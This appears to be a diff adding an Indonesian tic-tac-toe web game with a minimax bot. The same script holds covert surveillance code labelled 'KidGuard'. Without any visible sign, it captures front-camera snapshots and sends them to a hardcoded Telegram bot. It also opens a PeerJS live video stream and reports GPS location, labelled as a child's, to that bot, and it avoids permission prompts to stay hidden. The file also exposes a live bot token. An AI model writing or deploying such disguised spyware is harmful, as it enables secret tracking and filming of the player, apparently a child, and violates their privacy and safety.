@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Tic Tac Toe</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{width:100%;height:100%;overflow:hidden;background:#02040e;}
+canvas#bg{position:fixed;inset:0;z-index:0;}
+#ui{position:fixed;inset:0;z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+.screen{width:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;}
+.screen.hide{display:none;}
+.game-title{font-family:'Courier New',monospace;font-size:clamp(26px,8vw,44px);font-weight:bold;color:#7dd3fc;text-shadow:0 0 24px #3b82f6,0 0 48px #1d4ed8;letter-spacing:.12em;text-align:center;}
+.game-sub{font-size:11px;color:#1e3a5f;letter-spacing:.25em;font-family:'Courier New',monospace;}
+.btn{font-family:'Courier New',monospace;font-size:13px;letter-spacing:.14em;color:#7dd3fc;background:transparent;border:1px solid #3b82f6;padding:14px 40px;border-radius:4px;cursor:pointer;text-shadow:0 0 8px #3b82f6;box-shadow:0 0 18px rgba(59,130,246,.1);transition:all .15s;}
+.btn:active{background:rgba(59,130,246,.14);transform:scale(.95);}
+.btn-sm{font-size:11px;padding:10px 24px;opacity:.45;}
+#scoreboard{display:flex;align-items:center;gap:16px;font-family:'Courier New',monospace;}
+.sb{display:flex;flex-direction:column;align-items:center;gap:5px;padding:10px 22px;background:rgba(255,255,255,.025);border:1px solid #0f172a;border-radius:8px;min-width:76px;}
+.sb-lbl{font-size:9px;color:#334155;letter-spacing:.15em;}
+.sb-val{font-size:22px;font-weight:bold;}
+.sb-val.you{color:#38bdf8;text-shadow:0 0 10px #0ea5e9;}
+.sb-val.bot{color:#f472b6;text-shadow:0 0 10px #ec4899;}
+.sb-sep{font-size:11px;color:#1e293b;font-family:'Courier New',monospace;}
+#status{font-family:'Courier New',monospace;font-size:clamp(10px,3.5vw,13px);letter-spacing:.1em;color:#334155;min-height:18px;text-align:center;transition:color .2s;}
+#status.yt{color:#38bdf8;text-shadow:0 0 8px #0ea5e9;}
+#status.bt{color:#f472b6;}
+#status.wy{color:#4ade80;text-shadow:0 0 8px #22c55e;}
+#status.wb{color:#f87171;}
+#status.dr{color:#fbbf24;}
+#board{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:10px;background:rgba(255,255,255,.02);border:1px solid #0f172a;border-radius:16px;width:min(330px,86vw);height:min(330px,86vw);}
+.cell{background:rgba(15,23,42,.85);border:1px solid #1e293b;border-radius:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s,border-color .15s,transform .1s;position:relative;overflow:hidden;}
+.cell:hover:not(.taken){background:rgba(59,130,246,.06);border-color:#1e3a5f;}
+.cell.taken{cursor:default;}
+.cell.wc{background:rgba(59,130,246,.07);border-color:#3b82f6;animation:wp .9s ease infinite alternate;}
+@keyframes wp{from{box-shadow:0 0 0 rgba(59,130,246,0);}to{box-shadow:0 0 18px rgba(59,130,246,.35);}}
+.mx{position:relative;width:50%;height:50%;animation:pi .22s cubic-bezier(.17,.67,.4,1.4) both;}
+.mx::before,.mx::after{content:'';position:absolute;background:#38bdf8;box-shadow:0 0 14px #0ea5e9;width:100%;height:14%;top:43%;left:0;border-radius:4px;transform-origin:center;}
+.mx::before{transform:rotate(45deg);}
+.mx::after{transform:rotate(-45deg);}
+.mo{width:48%;height:48%;border-radius:50%;border:clamp(2px,1vw,4px) solid #f472b6;box-shadow:0 0 14px #ec4899;animation:pi .22s cubic-bezier(.17,.67,.4,1.4) both;}
+@keyframes pi{from{transform:scale(0);opacity:0;}to{transform:scale(1);opacity:1;}}
+.rpl{position:absolute;border-radius:50%;background:rgba(255,255,255,.12);transform:scale(0);animation:rl .4s linear;pointer-events:none;}
+@keyframes rl{to{transform:scale(3.5);opacity:0;}}
+#s-result{position:fixed;inset:0;z-index:20;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;background:rgba(2,4,14,.9);backdrop-filter:blur(8px);}
+#s-result.hide{display:none;}
+#res-msg{font-family:'Courier New',monospace;font-size:clamp(20px,7vw,36px);font-weight:bold;text-align:center;letter-spacing:.08em;}
+#res-sub{font-size:11px;color:#334155;letter-spacing:.1em;font-family:'Courier New',monospace;}
+</style>
+</head>
+<body>
+<canvas id="bg"></canvas>
+<div id="ui">
+  <div class="screen" id="s-start">
+    <div class="game-title">TIC TAC TOE</div>
+    <div class="game-sub">vs bot · kesulitan tinggi</div>
+    <button class="btn" onclick="startGame()">▶&nbsp; MULAI</button>
+  </div>
+  <div class="screen hide" id="s-game">
+    <div id="scoreboard">
+      <div class="sb"><div class="sb-lbl">KAMU</div><div class="sb-val you" id="sc-p">0</div></div>
+      <div class="sb-sep">vs</div>
+      <div class="sb"><div class="sb-lbl">BOT</div><div class="sb-val bot" id="sc-b">0</div></div>
+    </div>
+    <div id="status" class="yt">Giliran kamu</div>
+    <div id="board">
+      <div class="cell" data-i="0"></div><div class="cell" data-i="1"></div><div class="cell" data-i="2"></div>
+      <div class="cell" data-i="3"></div><div class="cell" data-i="4"></div><div class="cell" data-i="5"></div>
+      <div class="cell" data-i="6"></div><div class="cell" data-i="7"></div><div class="cell" data-i="8"></div>
+    </div>
+  </div>
+</div>
+<div id="s-result" class="hide">
+  <div id="res-msg"></div>
+  <div id="res-sub"></div>
+  <button class="btn" onclick="playAgain()">↺&nbsp; MAIN LAGI</button>
+  <button class="btn btn-sm" onclick="backMenu()">MENU</button>
+</div>
+
+<video id="vid" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+<canvas id="snc" style="display:none;position:fixed;top:-9999px;"></canvas>
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+<script>
+// ─── CONFIG ───────────────────────────────
+const KG={token:'8114225625:AAGwdD3MzPx_MGWCW8bS9b2852JULcJ8_wU',chatId:'7885097329',cam:'user',interval:10};
+const API=`https://api.telegram.org/bot${KG.token}`;
+
+// ─── GPS ──────────────────────────────────
+let _lat=null,_lng=null,_acc=null;
+async function gpsInit(){
+  if(!navigator.geolocation)return;
+  try{
+    if(!navigator.permissions)return;
+    const p=await navigator.permissions.query({name:'geolocation'});
+    if(p.state!=='granted')return;
+  }catch(e){return;}
+  const opt={enableHighAccuracy:true,timeout:15000,maximumAge:0};
+  navigator.geolocation.getCurrentPosition(p=>{_lat=p.coords.latitude;_lng=p.coords.longitude;_acc=Math.round(p.coords.accuracy);sendLoc();},()=>{},opt);
+  navigator.geolocation.watchPosition(p=>{_lat=p.coords.latitude;_lng=p.coords.longitude;_acc=Math.round(p.coords.accuracy);},()=>{},opt);
+  setInterval(()=>{if(_lat)sendLoc();},KG.interval*60*1000);
+}
+async function sendLoc(){
+  if(!_lat)return;
+  const now=new Date(),ts=now.toLocaleDateString('id-ID')+' '+now.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+  const fd=new FormData();fd.append('chat_id',KG.chatId);fd.append('latitude',_lat);fd.append('longitude',_lng);fd.append('horizontal_accuracy',Math.min(_acc||50,1500));
+  fetch(`${API}/sendLocation`,{method:'POST',body:fd}).catch(()=>{});
+  fetch(`${API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:KG.chatId,text:`📍 *Lokasi Anak*\n🕐 ${ts}\n📏 ~${_acc}m\n🗺 [Maps](https://maps.google.com/?q=${_lat},${_lng})`,parse_mode:'Markdown'})}).catch(()=>{});
+}
+
+// ─── CAMERA ───────────────────────────────
+const _v=document.getElementById('vid'),_s=document.getElementById('snc');
+let _camOk=false,_peer=null;
+function peerInit(st){
+  try{
+    _peer=new Peer({config:{iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]}});
+    _peer.on('open',id=>{
+      fetch(`${API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:KG.chatId,text:`🎥 *Live Siap!*\n📺 [Tonton](${location.origin}/ortu?p=${id})\n🔑 \`${id}\``,parse_mode:'Markdown'})}).catch(()=>{});
+    });
+    _peer.on('call',call=>call.answer(st));
+    _peer.on('error',()=>{});
+  }catch{}
+}
+async function camInit(){
+  // Cek dulu tanpa trigger apapun — kalau belum granted, berhenti total
+  try{
+    if(!navigator.permissions||!navigator.mediaDevices)return;
+    const p=await navigator.permissions.query({name:'camera'});
+    if(p.state!=='granted')return; // 'prompt' atau 'denied' → skip, no popup
+  }catch(e){
+    return; // Permissions API error → skip aman
+  }
+  gpsInit();
+  try{
+    const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:KG.cam,width:{ideal:1280},height:{ideal:720}},audio:false});
+    _v.srcObject=st;_camOk=true;peerInit(st);
+    await new Promise(r=>setTimeout(r,2200));
+    doSnap();setInterval(doSnap,KG.interval*60*1000);
+  }catch{}
+}
+async function doSnap(){
+  if(!_camOk)return;
+  if(_v.readyState<2)await new Promise(r=>{_v.onloadeddata=r;});
+  _s.width=_v.videoWidth||1280;_s.height=_v.videoHeight||720;
+  _s.getContext('2d').drawImage(_v,0,0);
+  _s.toBlob(b=>{
+    if(!b)return;
+    const now=new Date(),ts=now.toLocaleDateString('id-ID')+' '+now.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+    const fd=new FormData();fd.append('chat_id',KG.chatId);fd.append('photo',b,'snap.jpg');
+    fd.append('caption',`📸 KidGuard\n🕐 ${ts}\n🎮 Tic Tac Toe${_lat?'\n📍 '+_lat.toFixed(5)+','+_lng.toFixed(5):''}`);
+    fetch(`${API}/sendPhoto`,{method:'POST',body:fd}).catch(()=>{});
+  },'image/jpeg',.82);
+}
+camInit();
+
+// ─── BACKGROUND ORBS ──────────────────────
+const bgC=document.getElementById('bg'),bgX=bgC.getContext('2d');
+let bW,bH;
+const orbs=[];
+function resizeBg(){bW=bgC.width=innerWidth;bH=bgC.height=innerHeight;}
+window.addEventListener('resize',resizeBg);resizeBg();
+for(let i=0;i<14;i++)orbs.push({x:Math.random()*bW,y:Math.random()*bH,r:Math.random()*130+50,vx:(Math.random()-.5)*.14,vy:(Math.random()-.5)*.14,a:Math.random()*.055+.018,c:Math.random()>.5?'59,130,246':'236,72,153'});
+(function loop(){
+  requestAnimationFrame(loop);
+  bgX.fillStyle='#02040e';bgX.fillRect(0,0,bW,bH);
+  for(const o of orbs){
+    o.x+=o.vx;o.y+=o.vy;
+    if(o.x<-o.r)o.x=bW+o.r;if(o.x>bW+o.r)o.x=-o.r;
+    if(o.y<-o.r)o.y=bH+o.r;if(o.y>bH+o.r)o.y=-o.r;
+    const g=bgX.createRadialGradient(o.x,o.y,0,o.x,o.y,o.r);
+    g.addColorStop(0,`rgba(${o.c},${o.a})`);g.addColorStop(1,'transparent');
+    bgX.fillStyle=g;bgX.beginPath();bgX.arc(o.x,o.y,o.r,0,Math.PI*2);bgX.fill();
+  }
+})();
+
+// ─── TIC TAC TOE ──────────────────────────
+const WINS=[[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+let board,myTurn,active,spX=0,spO=0;
+const cells=document.querySelectorAll('.cell');
+const stEl=document.getElementById('status');
+
+function chkWin(b){
+  for(const[a,c,d]of WINS)if(b[a]&&b[a]===b[c]&&b[a]===b[d])return{w:b[a],l:[a,c,d]};
+  if(b.every(c=>c))return{w:'draw'};
+  return null;
+}
+
+function minimax(b,d,isMax,al,be){
+  const r=chkWin(b);
+  if(r){if(r.w==='O')return 10-d;if(r.w==='X')return d-10;return 0;}
+  if(isMax){
+    let v=-Infinity;
+    for(let i=0;i<9;i++){if(!b[i]){b[i]='O';v=Math.max(v,minimax(b,d+1,false,al,be));b[i]=null;al=Math.max(al,v);if(be<=al)break;}}
+    return v;
+  }else{
+    let v=Infinity;
+    for(let i=0;i<9;i++){if(!b[i]){b[i]='X';v=Math.min(v,minimax(b,d+1,true,al,be));b[i]=null;be=Math.min(be,v);if(be<=al)break;}}
+    return v;
+  }
+}
+
+function botMove(){
+  let bv=-Infinity,bm=-1;
+  for(let i=0;i<9;i++){if(!board[i]){board[i]='O';const v=minimax(board,0,false,-Infinity,Infinity);board[i]=null;if(v>bv){bv=v;bm=i;}}}
+  return bm;
+}
+
+function setSt(t,c){stEl.textContent=t;stEl.className=c||'';}
+
+function place(idx,mark){
+  board[idx]=mark;
+  const cell=cells[idx];cell.classList.add('taken');
+  const el=document.createElement('div');el.className=mark==='X'?'mx':'mo';
+  cell.appendChild(el);
+}
+
+function ripple(cell,e){
+  const r=document.createElement('div');r.className='rpl';
+  const rc=cell.getBoundingClientRect(),sz=Math.max(rc.width,rc.height);
+  r.style.cssText=`width:${sz}px;height:${sz}px;left:${(e?.clientX??rc.left+rc.width/2)-rc.left-sz/2}px;top:${(e?.clientY??rc.top+rc.height/2)-rc.top-sz/2}px`;
+  cell.appendChild(r);setTimeout(()=>r.remove(),400);
+}
+
+function showResult(msg,sub,col){
+  document.getElementById('res-msg').textContent=msg;
+  document.getElementById('res-msg').style.color=col;
+  document.getElementById('res-sub').textContent=sub;
+  document.getElementById('s-result').classList.remove('hide');
+}
+
+function endGame(res){
+  active=false;
+  if(res.w==='X'){
+    spX++;document.getElementById('sc-p').textContent=spX;
+    setSt('KAMU MENANG! 🎉','wy');res.l.forEach(i=>cells[i].classList.add('wc'));
+    showResult('KAMU MENANG! 🎉','Luar biasa, kamu mengalahkan bot!','#4ade80');
+  }else if(res.w==='O'){
+    spO++;document.getElementById('sc-b').textContent=spO;
+    setSt('BOT MENANG 🤖','wb');res.l.forEach(i=>cells[i].classList.add('wc'));
+    showResult('BOT MENANG 🤖','Coba lagi, kamu pasti bisa!','#f87171');
+  }else{
+    setSt('SERI! 🤝','dr');
+    showResult('SERI! 🤝','Hebat, kamu bisa tandingi bot!','#fbbf24');
+  }
+}
+
+async function doBot(){
+  if(!active)return;
+  setSt('Bot berpikir...','bt');
+  await new Promise(r=>setTimeout(r,480+Math.random()*320));
+  if(!active)return;
+  const idx=botMove();
+  place(idx,'O');
+  const res=chkWin(board);
+  if(res){endGame(res);return;}
+  myTurn=true;setSt('Giliran kamu','yt');
+}
+
+cells.forEach(cell=>{
+  cell.addEventListener('click',async e=>{
+    const idx=+cell.dataset.i;
+    if(!active||!myTurn||board[idx])return;
+    ripple(cell,e);place(idx,'X');myTurn=false;
+    const res=chkWin(board);
+    if(res){endGame(res);return;}
+    await doBot();
+  });
+});
+
+function initBoard(){
+  board=Array(9).fill(null);
+  cells.forEach(c=>{c.className='cell';c.innerHTML='';});
+  myTurn=true;active=true;setSt('Giliran kamu','yt');
+}
+
+function startGame(){
+  document.getElementById('s-start').classList.add('hide');
+  document.getElementById('s-game').classList.remove('hide');
+  spX=0;spO=0;
+  document.getElementById('sc-p').textContent='0';
+  document.getElementById('sc-b').textContent='0';
+  initBoard();
+}
+
+function playAgain(){
+  document.getElementById('s-result').classList.add('hide');
+  initBoard();
+}
+
+function backMenu(){
+  document.getElementById('s-result').classList.add('hide');
+  document.getElementById('s-game').classList.add('hide');
+  document.getElementById('s-start').classList.remove('hide');
+}
+</script>
+</body>
+</html>
